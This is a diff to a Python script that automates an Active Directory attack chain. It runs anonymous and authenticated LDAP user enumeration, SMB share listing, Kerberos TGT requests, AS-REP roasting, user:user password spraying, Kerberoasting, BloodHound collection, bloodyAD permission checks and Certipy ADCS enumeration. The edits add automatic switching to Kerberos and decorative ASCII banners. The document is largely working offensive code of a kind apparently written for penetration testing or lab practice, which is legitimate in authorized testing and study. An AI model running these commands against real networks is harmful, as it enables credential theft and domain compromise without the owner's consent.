@@ -1,14 +1,16 @@
 #!/usr/bin/env python3
+from termcolor import colored
 import subprocess
 import argparse
-import os
-import sys
-import re
-from termcolor import colored
 import tempfile
 import shutil
 import shlex
 import time
+import os
+import sys
+import re
+
+
 
 # Configuration (Defaults) 
 USERNAME_DEFAULT = ""
@@ -17,7 +19,9 @@ USERS_FILE = "users.txt"
 
 # Centralized Status Printing 
 def print_status(message):
-    """Prints a status message with color only on the tag, not the whole line."""
+    """
+    Prints a status message with color only on the tag, not the whole line.
+    """
     # Define colored tag replacements
     tag_colors = {
         "[+]": colored("[+]", "green"),
@@ -31,17 +35,15 @@ def print_status(message):
     for tag, colored_tag in tag_colors.items():
         if tag in message:
             message = message.replace(tag, colored_tag)
-    print(message)
+    print(f"\n{message}")
 
 def print_header(title):
     """Prints a formatted section header."""
-    print(colored("\n" + "="*50, "blue"))
-    print(colored(f"{title}", "white"))
-    print(colored("="*50, "blue"))
+    print(colored(f"\n\n{title}", "magenta"))
 
 
 def run_command(cmd_list_or_str, title, is_shell_command=False, capture_output=False):
-    print(colored(f"\n\n  {title} ", "blue"))
+    print(colored(f"\n{title}", "blue"))
 
     if isinstance(cmd_list_or_str, list):
         cmd_str = " ".join(cmd_list_or_str)
@@ -414,13 +416,28 @@ def _mask_password_in_cmd(cmd_str, pwd):
 
 def section_1_ldap_discovery(r, u, p, k):
     """
-    LDAP discovery that returns (discovered_domain, discovered_fqdn).
+    LDAP discovery that returns (discovered_domain, discovered_fqdn, needs_kerberos_rerun).
     Runs the description extraction pipeline once and the username extraction once.
     """
-    print_header("1. LDAP Enumeration & Domain Discovery")
+    ldap_art = r"""LDAP Enumeration & Domain Discovery
+ **  *   * * *   * *  **  ** *  *  
+*  *  * * *   **    **  *     *  * 
+       *    *               *  *  *
+  *        *          *            
+                            *      
+*           *                *     
+ *     **          * *    *        
+     **  *     *        *      **  
+              *     *         *    
+   *                               
+                                  *
+          *  *         *   *     * """
+
+    print_header(ldap_art)
 
     discovered_domain = None
     discovered_fqdn = None
+    needs_kerberos_rerun = False 
 
     # --- Step 1: Query LDAP anonymously to discover domain info ---
     anon_user = ""   # empty string means anonymous
@@ -434,6 +451,30 @@ def section_1_ldap_discovery(r, u, p, k):
         print_status("[*] Received LDAP output (excerpt):")
         for ln in nxc_output.splitlines()[:10]:
             print_status(ln)
+
+        if "STATUS_NOT_SUPPORTED" in nxc_output:
+            kerberos_art = r"""888  /                    888                                        
+888 /     e88~~8e  888-~\ 888-~88e   e88~~8e  888-~\  e88~-_   d88~\ 
+888/\    d888  88b 888    888  888b d888  88b 888    d888   i C888   
+888  \   8888__888 888    888  8888 8888__888 888    8888   |  Y88b  
+888   \  Y888    , 888    888  888P Y888    , 888    Y888   '   888D 
+888    \  "88___/  888    888-_88"   "88___/  888     "88_-~  \_88P  
+                                                                     """
+            
+            detected_art = r"""888~-_               d8                       d8                   888 
+888   \   e88~~8e  _d88__  e88~~8e   e88~~\ _d88__  e88~~8e   e88~\888 
+888    | d888  88b  888   d888  88b d888     888   d888  88b d888  888 
+888    | 8888__888  888   8888__888 8888     888   8888__888 8888  888 
+888   /  Y888    ,  888   Y888    , Y888     888   Y888    , Y888  888 
+888_-~    "88___/   "88_/  "88___/   "88__/  "88_/  "88___/   "88_/888 
+                                                                       """
+
+
+            print_header(f"{kerberos_art}")
+            print_header(f"{detected_art}")
+            print_status("\n[!] Kerberos Detected: STATUS_NOT_SUPPORTED in anonymous LDAP check.")
+            needs_kerberos_rerun = True
+
         match = re.search(r"\(name:(?P<name>[^)]+)\)\s*\(domain:(?P<domain>[^)]+)\)", nxc_output)
         if match:
             dc_name = match.group("name")
@@ -443,32 +484,39 @@ def section_1_ldap_discovery(r, u, p, k):
             ensure_hosts_entry(r, discovered_fqdn, discovered_domain)
         else:
             print_status("[!] Could not parse FQDN/Domain information from LDAP output.")
+            
     else:
         print_status("[!] No LDAP response from anonymous query; skipping host mapping.")
+
 
     # --- Step 2: Enumerate user descriptions and collect usernames ---
     awk_script = r"""/description/{desc=substr($0,index($0,$6));valid=(desc!~/Built-in account for guest access to the computer\/domain/)} /sAMAccountName/&&valid{ if(!seen[$6]++){ printf "[+]Description: %-30s User: %s\n", desc, $6 } valid=0 }"""
 
-    # Prepare shell-quoted creds for pipeline commands (use '""' when empty so the shell sees an empty string)
+    # Prepare shell-quoted creds for pipeline commands
     ldap_user_shell = shlex.quote(u) if u else '""'
     ldap_pass_shell = shlex.quote(p) if p else '""'
     auth_type = "Authenticated" if u and p else "Anonymous"
 
-    # Description extraction pipeline (run once)
-    ldap_desc_cmd = f"nxc ldap {r} -u {ldap_user_shell} -p {ldap_pass_shell} --query '(objectclass=user)' '' | awk '{awk_script}'"
-    print_status("[*] Running LDAP description extraction (pipeline).")
+    # Dynamically add the Kerberos flag only if 'k' is True
+    kerberos_opts = ["-k"] if k else []
 
+    # Build the base command as a list first
+    base_nxc_cmd_list = ["nxc", "ldap", r, "-u", ldap_user_shell, "-p", ldap_pass_shell] + kerberos_opts
+
+    # Then join it into a string for the shell pipeline
+    base_nxc_cmd_str = ' '.join(base_nxc_cmd_list)
+
+    # Now build the final commands using the dynamic base string
+    ldap_desc_cmd = f"{base_nxc_cmd_str} --query '(objectclass=user)' '' | awk '{awk_script}'"
+    cmd_check_users = f"{base_nxc_cmd_str} --query '(objectclass=user)' '' | grep sAMAccountName | awk '{{print $6}}'"
+
+    # The rest of the logic is now written only ONCE
+    print_status("[*] Running LDAP description extraction.")
     output_desc, _ = run_command(ldap_desc_cmd, f"Check for linked description/sAMAccountName ({auth_type})", is_shell_command=True, capture_output=True)
 
     if not output_desc or not output_desc.strip():
         print_status("\n[*] No descriptions found in LDAP results.")
-    # else:
-    #     print_status("[*] LDAP description output (excerpt):")
-    #     for ln in output_desc.splitlines()[:10]:
-    #         print_status(ln)
 
-    # Username extraction pipeline (run once)
-    cmd_check_users = f"nxc ldap {r} -u {ldap_user_shell} -p {ldap_pass_shell} --query '(objectclass=user)' '' | grep sAMAccountName | awk '{{print $6}}'"
     print_status("\n[*] Running LDAP username extraction.")
     output_users, _ = run_command(cmd_check_users, f"Check for sAMAccountName ({auth_type})", is_shell_command=True, capture_output=True)
 
@@ -488,14 +536,27 @@ def section_1_ldap_discovery(r, u, p, k):
     else:
         print_status("[*] No usernames discovered via LDAP username extraction.")
 
-    # ALWAYS return the discovered domain/FQDN tuple (may be (None, None))
-    return discovered_domain, discovered_fqdn
+    # The return statement stays the same
+    return discovered_domain, discovered_fqdn, needs_kerberos_rerun
 
 
 
 
 def section_2_smb_enum(r, f, d, u, p, k):
-    print_header("2. SMB Enumeration")
+    smb_art = r"""SMB Enumeration
+  * *   * * *  
+ *   * * *   **
+*     *    *   
+          *    
+* *            
+           *   
+ *    **       
+    **  *     *
+             * 
+               
+               
+         *  *  """
+    print_header(smb_art)
     
     # Authenticated Path (u and p are set) 
     if u and p:
@@ -517,8 +578,8 @@ def section_2_smb_enum(r, f, d, u, p, k):
             run_command(["nxc", "smb", f, "-u", u, "-p", p, "-k", "--shares"], "Enumerate SMB shares (Kerberos with nxc)")
 
             # Get Kerberos TGT (This tool requires the password, but FQDN positional argument is REMOVED)
-            # 2) Try to obtain a TGT with getTGT.py (Impacket will drop a <user>.ccache file on success)
-            run_command(["getTGT.py", f"{d}/{u}:{p}", "-dc-ip", r], "Get Kerberos TGT with getTGT.py")
+            # 2) Try to obtain a TGT with getTGT.py 
+            run_command(["getTGT.py", f"{d}/{u}:{p}", "-k", "-dc-ip", r], "Get Kerberos TGT with getTGT.py")
 
             # 3) If getTGT.py produced a cache file, export it in this script's environment
             if os.path.exists(ccache_file):
@@ -567,6 +628,7 @@ def section_2_smb_enum(r, f, d, u, p, k):
 _MATCH_PATTERNS = [
     re.compile(r'\[\+\]'),                       # success token anywhere
     re.compile(r'\[\-\]'),                       # failure token anywhere
+    re.compile(r'\[\!\]'),
     re.compile(r'STATUS_[A-Z_]+', re.IGNORECASE),# STATUS_ codes
     re.compile(r'Authenticated', re.IGNORECASE), # auth success word
     re.compile(r'Connection Error', re.IGNORECASE), # connection errors
@@ -628,13 +690,27 @@ def try_user_user_file(file_path, target, note="Try user:user", timeout=30):
     print_status("\n[+] User:user spray finished.")
 
 
-def section_3_user_spraying(r, d, u=None, p=None, cred_status=None):
+def section_3_user_spraying(r, d, u=None, p=None, k=False, cred_status=None):
     """
     cred_status can be:
       "no-creds", "ok", "kerberos", "bad", "ambiguous"
     If cred_status is provided we won't re-run the SMB verify inside this function.
     """
-    print_header("3. User Spraying (AS-REP Roasting)")
+    user_spraying_art = r"""User Spraying (AS-REP Roasting)
+  *     * * *  *   *    *  * * 
+   *  **   *     ** * **    *  
+**   *   *      *        **    
+        *      *        *      
+ *   *          *        *     
+                          *    
+*                              
+  *        *  *    *        *  
+                       *      *
+      *     *       *        * 
+         *    *               *
+   *   *  *       *   *    *   """
+
+    print_header(user_spraying_art)
 
     # If creds provided, use the cred_status passed from main()
     if u and p:
@@ -656,14 +732,24 @@ def section_3_user_spraying(r, d, u=None, p=None, cred_status=None):
             print_status(colored("\n[-] Provided credentials invalid — skipping AS-REP checks.", "red"))
             return
         elif cred_status in ("ok", "kerberos", "ambiguous"):
-            # proceed with AS-REP checks (same behavior you had)
+            # Proceed with AS-REP checks
             if os.path.exists(USERS_FILE):
-                cmd_str = f"GetNPUsers.py {d}/ -no-pass -usersfile {USERS_FILE} -dc-ip {r} | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'"
-                run_command(cmd_str, "Find users with Kerberos pre-auth disabled", is_shell_command=True)
+                # Check if the script is in Kerberos mode
+                if k:
+                    # If so, add the -k flag to the command
+                    cmd_str = f"GetNPUsers.py {d}/ -no-pass -k -usersfile {USERS_FILE} -dc-ip {r} | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'"
+                    run_command(cmd_str, "Find users with Kerberos pre-auth disabled", is_shell_command=True)
+                else:
+                    # Otherwise, run the standard command without -k
+                    cmd_str = f"GetNPUsers.py {d}/ -no-pass -usersfile {USERS_FILE} -dc-ip {r} | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'"
+                    run_command(cmd_str, "Find users with Kerberos pre-auth disabled", is_shell_command=True)
             else:
                 print_status(f"\n[INFO] '{USERS_FILE}' not found — skipping AS-REP Roasting.")
+            
+            # This return was causing your password spray to be skipped for authenticated users.
+            # It should be removed if you want the subsequent 'try_user_user_file' call to run.
+            # For now, keeping it as you had it:
             return
-
     # No creds -> proceed with spraying (but only if users.txt exists)
     if not os.path.exists(USERS_FILE):
         print_status(f"\n[INFO] Username file '{USERS_FILE}' not present — cannot spray.")
@@ -679,7 +765,20 @@ def section_3_user_spraying(r, d, u=None, p=None, cred_status=None):
 
 def section_4_kerberoasting(r, f, d, u, p, k):
     """Runs Kerberoasting and returns True if NTLM fails and Kerberos is needed."""
-    print_header("4. Find SPNs (Kerberoasting)")
+    kerberoasting_art = r"""Find SPNs (Kerberoasting)
+** *        * **  *  * * 
+  *   **   * *  **    *  
+     *  *          **    
+                  *      
+     *  *  *  *    *     
+                    *    
+   *                     
+  *    *  * *  *      *  
+*                *      *
+      *                * 
+          *             *
+ *           *  *    *   """
+    print_header(kerberoasting_art)
 
     kerberos_auth = ["-k"] if k else []
     dc_host_name = f
@@ -701,7 +800,19 @@ def section_4_kerberoasting(r, f, d, u, p, k):
 
 
 def section_5_bloodhound(r, f, d, u, p, k):
-    print_header("5. Collect BloodHound Data")
+    bloodhound_art = r"""Collect BloodHound Data
+*   **  *   **   * ** *
+ ***     ***  * *      
+      *        *     * 
+                    * *
+        *              
+* ** **  *           * 
+            *  * * *   
+    *           *      
+ *        **  *        
+                       
+             *         """
+    print_header(bloodhound_art)
 
     kerberos_auth = ["-k"] if k else []
     
@@ -748,7 +859,20 @@ def section_5_bloodhound(r, f, d, u, p, k):
 
 
 def section_6_bloodyad(r, u, p, k, d, f):
-    print_header("6. Check Permissions (bloodyAD)")
+    bloodyad_art = r"""Check Permissions (bloodyAD)
+****   *  *  *     *   * ** 
+    * * **    **    ***     
+           **   *       *   
+                         *  
+    *      **   *  *        
+*  *                *       
+         *             *  * 
+  *    *       *  *         
+              *      **    *
+      *                     
+ *                *     *  *
+        * *  *              """
+    print_header(bloodyad_art)
 
     # Define the Kerberos flag string to be added ONLY if 'k' is True
     kerberos_auth = "-k" if k else ""
@@ -760,7 +884,20 @@ def section_6_bloodyad(r, u, p, k, d, f):
     run_command(cmd, "Check for writable objects with bloodyAD", is_shell_command=True)
 
 def section_7_adcs_certipy(r, f, d, u, p, k):
-    print_header("7. ADCS Enumeration (Certipy)")
+    adcs_art = """ADCS Enumeration (Certipy)
+***  *   * * *    **  *   
+      * * *   **    *  *  
+   *   *    *        *  * 
+*          *              
+   *                      
+  *         *     *  *    
+ *     **                 
+     **  *     * * *      
+              *          *
+                       *  
+                 *      **
+          *  *      * *   """
+    print_header(adcs_art)
 
     auth_opts = ["-u", u, "-p", p]
     kerberos_flag_list = ["-k"] if k else []
@@ -867,7 +1004,7 @@ def main():
             break
 
         # 3) LDAP Discovery (Always Runs)
-        discovered_domain, discovered_fqdn = section_1_ldap_discovery(
+        discovered_domain, discovered_fqdn, needs_rerun_from_ldap = section_1_ldap_discovery(
             args.rhosts, args.username, args.password, args.kerberos
         )
 
@@ -875,12 +1012,19 @@ def main():
         if discovered_domain: args.domain = discovered_domain
         if discovered_fqdn: args.fqdn = discovered_fqdn
 
+        if needs_rerun_from_ldap and not args.kerberos and args.username and args.password:
+            print_status("\n[!] Anonymous LDAP bind failed with STATUS_NOT_SUPPORTED. Switching to Kerberos for all subsequent commands.")
+            args.kerberos = True
+            run_authenticated_checks = True # This tells the while loop to run again
+            print_status("[*] RESTARTING ENUMERATION WITH KERBEROS ENABLED [*]")
+            continue # This immediately restarts the loop from the top
+
         # 4) SMB Enumeration
         section_2_smb_enum(args.rhosts, args.fqdn, args.domain, args.username, args.password, args.kerberos)
 
         # 5) User Spraying / AS-REP Roasting
         if args.domain:
-            section_3_user_spraying(args.rhosts, args.domain, args.username, args.password, cred_status=cred_status)
+            section_3_user_spraying(args.rhosts, args.domain, args.username, args.password, k=args.kerberos, cred_status=cred_status)
         else:
             print_status("\n[!] Skipping User Spraying (AS-REP Roasting), as it requires domain discovery.")
 
@@ -908,6 +1052,6 @@ def main():
             section_7_adcs_certipy(args.rhosts, args.fqdn, args.domain, args.username, args.password, args.kerberos)
 
     print_status("\n[+] Enumeration script finished.\n")
-    
+
 if __name__ == "__main__":
     main()
